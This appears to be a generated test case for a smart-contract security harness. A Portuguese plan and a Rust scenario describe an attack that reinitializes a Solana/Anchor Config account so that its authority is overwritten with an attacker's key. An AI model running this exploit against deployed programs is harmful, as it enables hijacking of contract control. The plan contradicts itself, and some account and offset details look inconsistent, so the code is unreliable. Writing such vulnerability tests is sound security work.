{
  "plan": "O programa usa uma flag `is_initialized` na conta Config para impedir reinicialização, mas a conta não é criada pela instrução (sem `init`), então o atacante pode fornecer uma conta Config já existente com `is_initialized = false` e sobrescrever o estado. O baseline chama `init` legitimamente com uma conta Config nova (is_initialized=false) e autoridade legítima, resultando em sucesso. O ataque chama `init` novamente com a mesma conta Config já inicializada (is_initialized=true) e uma nova autoridade, tentando sobrescrever o estado. O efeito mede se a autoridade foi alterada para a nova chave e/ou se `is_initialized` permaneceu true, indicando reinicialização bem-sucedida.",
  "scenario": "let authority = Pubkey::new_unique();
let attacker = Pubkey::new_unique();

// Conta Config inicial (não inicializada)
let config_data = anchor_account_data("Config", &(authority, false, 0u64));
let config_account = account(&env.program_id, &config_data, None);

// Contas para o baseline
let contas_baseline = vec![
    (env.program_id, config_account.clone()),
    (authority, wallet(1_000_000_000)),
];

// Instrução baseline: init com autoridade legítima
let ix_baseline = env.anchor_ix("init", &(), vec![
    AccountMeta::new(env.program_id, false),
    AccountMeta::new_readonly(authority, true),
]);

let r_baseline = env.baseline("init legítimo", &ix_baseline, &contas_baseline);

// Após o baseline, a conta Config deve estar inicializada com authority
let config_pos = after(&r_baseline, &env.program_id);
let config_data_pos = config_pos.data();
let authority_pos = read_pubkey(config_data_pos, 8); // offset 8: após discriminador
let is_init_pos = config_data_pos[40] != 0; // offset 40: authority(32) + is_initialized(1) + padding? Vamos calcular: discriminator 8 + authority 32 = 40, então is_initialized em 40

// Ataque: chamar init novamente com a mesma conta Config já inicializada, mas com nova autoridade
let contas_ataque = vec![
    (env.program_id, config_pos.clone()),
    (attacker, wallet(1_000_000_000)),
];

let ix_ataque = env.anchor_ix("init", &(), vec![
    AccountMeta::new(env.program_id, false),
    AccountMeta::new_readonly(attacker, true),
]);

let r_ataque = env.attack("reinit", &ix_ataque, &contas_ataque);

if r_ataque.program_result == ProgramResult::Success {
    let config_ataque = after(&r_ataque, &env.program_id);
    let data_ataque = config_ataque.data();
    let authority_ataque = read_pubkey(data_ataque, 8);
    let is_init_ataque = data_ataque[40] != 0;
    // Efeito: a autoridade foi sobrescrita para o atacante e a conta continua inicializada
    env.effect("authority sobrescrita para atacante", authority_ataque == attacker);
    env.effect("is_initialized permanece true", is_init_ataque);
}"
}

